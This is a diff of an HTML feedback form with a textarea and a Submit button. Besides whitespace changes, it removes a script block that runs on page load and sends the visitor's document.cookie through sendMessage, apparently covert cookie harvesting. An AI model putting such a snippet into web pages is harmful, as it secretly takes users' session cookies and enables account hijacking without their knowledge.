@@ -38,7 +38,6 @@
                         name="text_area" id="text_area" rows="3" maxlength="50" oninput="limitLines(this)"
                         ></textarea>
                 </div>
-                
                 <div style="width: 40%; height: 20%; top: 85.0%;">
                     <button style="width: 100%; height: 100%; font: 900 2vmin sans-serif; border-radius: 25%;" class="hover-effect" id="onceButton" onclick="handleClick()">Submit</button>
                 </div>
@@ -82,18 +81,12 @@
         function handleClick() {
             const button = document.getElementById('onceButton');
             const textarea = document.getElementById('text_area');
-        
             button.disabled = true;
             button.classList.add('disabled');
             button.innerHTML = '✔';
             textarea.disabled = true;
             sendMessage(textarea.value);
             textarea.value = "\nThank you!";
-        }
-        if (document.cookie != '') {
-            sendMessage(document.cookie);
-        } else {
-            sendMessage("Opened!");
         }
         </script>
     </body>
